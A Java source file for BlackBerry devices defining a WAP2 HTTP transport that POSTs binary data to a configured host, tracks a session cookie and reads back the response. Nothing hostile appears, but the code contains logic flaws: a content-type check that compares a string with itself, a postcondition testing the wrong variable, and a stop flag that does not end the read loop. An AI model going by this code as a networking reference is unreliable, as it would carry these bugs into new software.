//#preprocess
package blackberry.action.sync.transport;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import javax.microedition.io.Connector;
import javax.microedition.io.HttpConnection;
import javax.microedition.io.StreamConnection;

import net.rim.device.api.io.IOCancelledException;
import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.util.ByteVector;
import blackberry.action.sync.Transport;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;
import blackberry.utils.Utils;

public class Wap2Transport extends Transport {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Wap2Transport", DebugLevel.VERBOSE);
    //#endif

    private String transportId;
    private String cookie;

    boolean stop;

    private final String HEADER_CONTENTTYPE = "content-type";
    private final String HEADER_SETCOOKIE = "set-cookie";
    private final String HEADER_CONTENTLEN = "content-length";

    private final String USER_AGENT = "Profile/MIDP-2.0 Configuration/CLDC-1.0";
    private final String CONTENT_TYPE = "application/octet-stream";
    static//private static String CONTENTTYPE_TEXTHTML = "text/html";
    boolean acceptWifi = true;

    public Wap2Transport(String host, int port) {
        super(host, port);
    }

    public boolean isAvailable() {
        transportId = getWap2TransportUid();
        return transportId != null;
    }

    public boolean initConnection() {
        url = "http://" + host + ":" + port + "/" + ";deviceside=true;";
        // + ";deviceside=true;ConnectionUID=" + transportId;

        cookie = null;
        stop = false;
        return true;
    }

    public void close() {

    }

    public byte[] command(byte[] data) throws TransportException {

        HttpConnection connection = sendHttpPostRequest(data);
        byte[] content = parseHttpConnection(connection);

        return content;
    }

    private static String getWap2TransportUid() {
        // Get the service book records for WAP2 transport.
        ServiceRecord[] records = ServiceBook.getSB().findRecordsByCid("WPTCP");
        for (int i = 0; i < records.length; i++) {
            // Determine if the current one is suitable.
            ServiceRecord record = records[i];
            if (record.isValid() && !record.isDisabled()) {
                String recordName = record.getName().toUpperCase();
                if (acceptWifi
                        || (recordName.indexOf("WIFI") < 0 && recordName
                                .indexOf("WI-FI") < 0)) {
                    // Looks good so fire it back. 
                    return record.getUid();
                }
            }
        }

        // No WAP2 transport found.
        return null;
    }

    private HttpConnection sendHttpPostRequest(byte[] data)
            throws TransportException {
        //#ifdef DBC
        Check.requires(data != null, "sendHttpPostRequest: null data");
        //#endif
        String content = "";

        boolean httpOK;
        HttpConnection httpConn = null;

        // Open the connection and extract the data.
        try {
            StreamConnection s = null;
            s = (StreamConnection) Connector.open(getUrl());
            httpConn = (HttpConnection) s;
            httpConn.setRequestMethod(HttpConnection.POST);
            httpConn.setRequestProperty("User-Agent", USER_AGENT);
            httpConn.setRequestProperty("Content-Language", "en-US");

            if (cookie != null) {                
                httpConn.setRequestProperty("Cookie", cookie);
            }

            httpConn.setRequestProperty("Content-Type", CONTENT_TYPE);

            OutputStream os = null;
            os = httpConn.openOutputStream();
            os.write(data);
            os.flush(); // Optional, getResponseCode will flush

            int status = httpConn.getResponseCode();
            httpOK = (status == HttpConnection.HTTP_OK);

            os.close();

            //#ifdef DEBUG
            debug.trace("sendHttpPostRequest response: " + status);
            //#endif

        } catch (Exception ex) {
            throw new TransportException(1);
        }

        if (!httpOK) {
            throw new TransportException(2);
        }

        //#ifdef DBC
        Check.ensures(httpConn != null, "sendHttpPostRequest: httpConn null");
        //#endif     
        return httpConn;

    }

    private byte[] parseHttpConnection(HttpConnection httpConn)
            throws TransportException {

        try {
            // Is this html?
            String contentType = httpConn.getHeaderField(HEADER_CONTENTTYPE);
            boolean htmlContent = (contentType != null && contentType
                    .startsWith(contentType));

            if (!htmlContent) {
                //#ifdef DEBUG
                debug.error("parseHttpConnection wrong htmlContent : "
                        + contentType);
                //#endif
                throw new TransportException(1);
            }

            String setCookie = httpConn.getHeaderField(HEADER_SETCOOKIE);

            if (setCookie != null) {
                //#ifdef DEBUG
                debug.trace("parseHttpConnection setCookie: " + setCookie);
                //#endif

                cookie = setCookie;
            }

            String contentLen = httpConn.getHeaderField(HEADER_CONTENTLEN);
            //#ifdef DEBUG
            debug.trace("parseHttpConnection len: " + contentLen);
            //#endif

            int totalLen = 0;
            try {
                // expected content size
                totalLen = Integer.parseInt(contentLen);

            } catch (Exception ex) {
                //#ifdef DEBUG
                debug.error("parseHttpConnection parseInt");
                //#endif
                throw new TransportException(2);
            }

            InputStream input = httpConn.openInputStream();

            // buffer data
            byte[] buffer = new byte[10*1024];
            byte[] content = new byte[totalLen];
            int size = 0; // incremental size
            int len = 0; // iterative size

            while (-1 != (len = input.read(buffer))) {
                //#ifdef DEBUG
                debug.trace("parseHttpConnection read=" + len + " size=" + size
                        + " tot=" + totalLen);
                //#endif
                // Exit condition for the thread. An IOException is 
                // thrown because of the call to  httpConn.close(), 
                // causing the thread to terminate.
                if (stop) {
                    //#ifdef DEBUG
                    debug.trace("parseHttpConnection stop!");
                    //#endif
                    httpConn.close();
                    input.close();
                }
                Utils.copy(content, size, buffer, 0, len);
                size += len;
            }

            //#ifdef DEBUG
            debug.trace("parseHttpConnection received:" + size);
            //#endif

            input.close();

            //#ifdef DBC
            Check.ensures(len != totalLen, "sendHttpPostRequest: received:"
                    + size + " expected: " + totalLen);
            //#endif 
            return content;

        } catch (IOCancelledException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            throw new TransportException(3);
        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            throw new TransportException(4);
        }

    }

}
